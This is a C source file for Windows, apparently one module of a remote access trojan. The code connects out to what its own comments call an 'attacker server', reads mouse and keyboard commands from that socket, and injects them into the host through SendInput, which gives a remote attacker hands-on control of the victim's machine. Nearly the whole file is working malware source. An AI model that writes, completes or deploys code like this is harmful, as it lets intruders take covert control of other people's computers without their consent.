/*
This source file consists of functions for controlling the mouse and keyboard
*/

#include "inputs.h"
#include "utils.h"

/*
Assigns the values of an INPUT structure based on a mouse input to simulate
Expects a buffer containing the inputs, the index of the input to generate, and a pointer to an INPUT structure
The passed INPUT structure will be filled out so it can be used to inject a mouse input to the OS
Returns the number of bytes read to build the INPUT structure
	for example, a MOUSE_POS input will return 9 (1 for input type plus 2 * 4 for x/y coords)
*/
int buildMouseInput(char* buffer, int idx, PINPUT in) {
	// local var for easy access to buffer[idx] and buffer[idx+1]
	char cmd = buffer[idx];
	char button = buffer[idx + 1];
	// set the default values for the INPUT struct
	in->type = INPUT_MOUSE;
	in->mi.dx = 0;
	in->mi.dy = 0;
	in->mi.mouseData = 0;
	in->mi.time = 0;
	in->mi.dwExtraInfo = 0;
	// check what the input type is
	if (cmd == MOUSE_WHEEL) { // mouse wheel scrolled
		in->mi.dwFlags = MOUSEEVENTF_WHEEL;
		char amount = buffer[idx + 2];
		if (amount == 0) { // was it a negative scroll amount?
			in->mi.mouseData = buffer[idx + 3] * -1;
			in->mi.mouseData *= 120; // MOUSE_DELTA = 120
			return 4;
		} else {
			in->mi.mouseData = amount;
			in->mi.mouseData *= 120; // MOUSE_DELTA = 120
			return 3;
		}
	} else if (cmd == MOUSE_POS) { // set mouse position
		in->mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
		int* ref = &buffer[idx + 1];
		in->mi.dx = ntohl(ref[0]);
		in->mi.dy = ntohl(ref[1]);
		return 9;
	} else if (cmd == MOUSE_DOWN) { // mouse down
		if (button == MOUSE_LEFT) {
			in->mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
		} else if (button == MOUSE_MIDDLE) {
			in->mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
		} else if (button == MOUSE_RIGHT) {
			in->mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
		} else { // couldn't match mouse button
			printf("Error! Could not match mouse down button!\n");
			return 0;
		}
		return 2;
	} else if (cmd == MOUSE_UP) { // mouse up
		if (button == MOUSE_LEFT) {
			in->mi.dwFlags = MOUSEEVENTF_LEFTUP;
		} else if (button == MOUSE_MIDDLE) {
			in->mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
		} else if (button == MOUSE_RIGHT) {
			in->mi.dwFlags = MOUSEEVENTF_RIGHTUP;
		} else { // couldn't match mouse button
			printf("Error! Could not match mouse up button!\n");
			return 0;
		}
		return 2;
	} else { // couldn't match with any kind of mouse input
		printf("Error! Could not find matching mouse event!\n");
		return 0;
	}
}

/*
Helper function to check if KEYEVENTF_EXTENDEDKEY needs to be set for a given virtual-key code
The following is pulled from the MSDN documentation:

The extended-key flag indicates whether the keystroke message originated from one of the
additional keys on the enhanced keyboard. The extended keys consist of the ALT and
CTRL keys on the right-hand side of the keyboard; the INS, DEL, HOME, END, PAGE UP, PAGE DOWN,
and arrow keys in the clusters to the left of the numeric keypad; the NUM LOCK key;
the BREAK (CTRL+PAUSE) key; the PRINT SCRN key; and the divide (/) and
ENTER keys in the numeric keypad. The extended-key flag is set if the key is an extended key.

And from stackoverflow:
VK_UP, VK_DOWN, VK_LEFT, VK_RIGHT, VK_HOME, VK_END, VK_PRIOR, VK_NEXT, VK_INSERT, VK_DELETE
*/
DWORD isExtendedKey(WORD code) {
	switch (code)
	{
		case VK_RMENU:
		case VK_RCONTROL:
		case VK_INSERT:
		case VK_DELETE:
		case VK_HOME:
		case VK_END:
		case VK_PRIOR:
		case VK_NEXT:
		case VK_LEFT:
		case VK_RIGHT:
		case VK_UP:
		case VK_DOWN:
			return KEYEVENTF_EXTENDEDKEY;
		default:
			return 0;
	}
}

/*
Assigns the values of an INPUT structure based on a keyboard input to simulate
Expects a buffer containing the inputs, the index of the input to generate, and a pointer to an INPUT structure
The passed INPUT structure will be filled out so it can be used to inject a keyboard input to the OS
Returns the number of bytes read to build the INPUT structure
	unless buffer[idx] is not a valid input, this always return 2
*/
int buildKeyboardInput(char* buffer, int idx, PINPUT in) {
	// local var for easy access to buffer[idx] and buffer[idx+1]
	char cmd = buffer[idx];
	char key = buffer[idx + 1];
	DWORD flags = isExtendedKey(key);
	// set the default values for the INPUT struct
	in->type = INPUT_KEYBOARD;
	in->ki.wScan = 0;
	in->ki.wVk = key;
	in->ki.dwFlags = 0;
	in->ki.time = 0;
	in->ki.dwExtraInfo = 0;
	// what was the cmd?
	if (cmd == KEY_UP) { // key up - add the KEYUP flag
		flags = flags | KEYEVENTF_KEYUP;
	} else if (cmd == KEY_DOWN) { // key down - do nothing
		//flags = flags | 0;
	} else { // unexpected cmd - this is an error
		printf("Error! Could not find matching keyboard event!\n");
		return 0;
	}
	// set the flags for the INPUT struct
	in->ki.dwFlags = flags;
	return 2;
}

/*
Simulate the inputs represented by a given buffer
Expects a buffer containing the inputs to generate and inject
The data within the buffer is expected to be in the following format:
	START_INPUTS input_type input_values input_type input_values ... END_INPUTS
	where input_type is either MOUSE_DOWN, MOUSE_UP, etc
	and input_values is the either the virtual-key code, mouse position, etc
This function returns nothing
TODO - is it better to inject all inputs at once using an array?
*/
void sendInputStream(char* buffer) {
	// locals used for parsing through the buffer
	int idx = 1;
	int prev = 0; // used to detect infinite loop
	char cmd = 0;
	// this INPUT structure gets filled out by the helper functions
	INPUT in;
	
	// make sure the buffer starts correctly
	if (buffer[0] != START_INPUTS) {
		printf("Input stream starts with unexted value: %d\n", buffer[0]);
		return;
	}

	// main loop
	while (buffer[idx] != END_INPUTS && idx != prev) {
		prev = idx; // update previous idx for detecting infinite loop
		cmd = buffer[idx];
		if (mouseControlled == 1) { // is the mouse controlled?
			switch (cmd) { // is the next input a mouse input? 
				case MOUSE_DOWN:
				case MOUSE_UP:
				case MOUSE_WHEEL:
				case MOUSE_POS:
					// build the input structure and insert it
					idx += buildMouseInput(buffer, idx, &in);
					if (SendInput(1, &in, sizeof(INPUT)) != 1) { // error handling
						printf("Error inserting mouse input: %d\n", GetLastError()); }
				// default - do nothing
			}
		}
		if (keyboardControlled == 1) { // is the keyboard controlled?
			switch (cmd) { // is the next input a keyboard input?
				case KEY_DOWN:
				case KEY_UP:
					// build the input structure and insert it
					idx += buildKeyboardInput(buffer, idx, &in);
					if (SendInput(1, &in, sizeof(INPUT)) != 1) {
						printf("Error inserting mouse input: %d\n", GetLastError()); }
				// default - do nothing
			}
		}
		// did multiple input streams get combined into one buffer?
		if (buffer[idx + 1] == START_INPUTS) {
			idx += 2; } // move idx to start of next input stream
	}
}

/*
Main function for the input control thread
Expects no arguments and always returns 0
The thread has 3 different stop conditions:
	1) the mouse and keyboard are no longer being controlled
	2) the attacker server closes its connection
	3) a socket error occurs during the socket recv() function
Once a stop condition is met, the thread will...
	reset mouseControlled and keyboardControlled to 0
	attempt to close the input control socket
	return from the function (ending the thread)
*/
DWORD WINAPI inputThreadFunc(void* data) {
	// local vars for socket recv()
	char buffer[4096];
	int retCode;
	// main loop
	while (mouseControlled == 1 || keyboardControlled == 1) {
		// get data from the socket and check the return value
		retCode = recv(inputSocket, buffer, 4096, 0);
		if (retCode == 0) { // connection closed
			printf("Input control socket closed...\n");
			break;
		} else if (retCode < 0) { // there was a socket error
			printf("Input control recv failed with error: %d\n", WSAGetLastError());
			break;
		}
		// if we got this far, we have a valid message to process
		sendInputStream(buffer);
	}
	// reset mouseControlled and keyboardControlled in case we broke out of the loop from an error
	mouseControlled = 0;
	keyboardControlled = 0;
	// try closing the socket
	if (closesocket(inputSocket) == SOCKET_ERROR) {
		printf("Error closing input control socket: %d\n", WSAGetLastError()); }
	// return 0 cuz why not
	return 0;
}

/*
Connect to the attacker server and start the input control thread
Does nothing if a connection is already established and the thread is already running
Expects no arguments
Returns nothing
TODO - return codes based on success, THREAD_ACTIVE, or error?
*/
void startInputThread() {
	// make sure that either the keyboard or mouse control is toggled on
	if (mouseControlled == 0 || keyboardControlled == 0) {
		return; }
	// check if the input control thread is running
	DWORD exitCode = STILL_ACTIVE + 1; // default to exitCode != STILL_ACTIVE
	if (inputThreadHandle != NULL) {
		if(!GetExitCodeThread(inputThreadHandle, &exitCode)) {
			printf("Error checking input control thread's status: %d\n", GetLastError());
			mouseControlled = 0; // reset mouse and keyboard control
			keyboardControlled = 0;
			return; // return to avoid creating more problems
		}
	}
	// don't go further if the thread is already running
	if (exitCode == STILL_ACTIVE) {
		return; }
	// try connecting to the attacker server
	if(connectToTCP(SERVER_ADDR, SERVER_INPUT_PORT, inputSocket)) {
		mouseControlled = 0; // reset mouse and keyboard control
		keyboardControlled = 0;
		return; // return to avoid creating more problems
	}
	// start the input control thread
	inputThreadHandle = CreateThread(NULL, 0, inputThreadFunc, NULL, 0, NULL);
}

/*
Toggles the attacker's control of the mouse
If toggling on and not already connected to the attacker server,
	this will connect to the attacker server and start the input control thread
Expects an argument of 0 or 1 to disable or enable mouse control, respectively
Returns nothing
*/
void toggleKeyboardControl(int toggle) {
	keyboardControlled = toggle;
	if (toggle == 1) {
		startInputThread(); }
}

/*
Toggles the attacker's control of the mouse
If toggling on and not already connected to the attacker server,
	this will connect to the attacker server and start the input control thread
Expects an argument of 0 or 1 to disable or enable mouse control, respectively
Returns nothing
*/
void toggleMouseControl(int toggle) {
	mouseControlled = toggle;
	if (toggle == 1) {
		startInputThread();
	}
}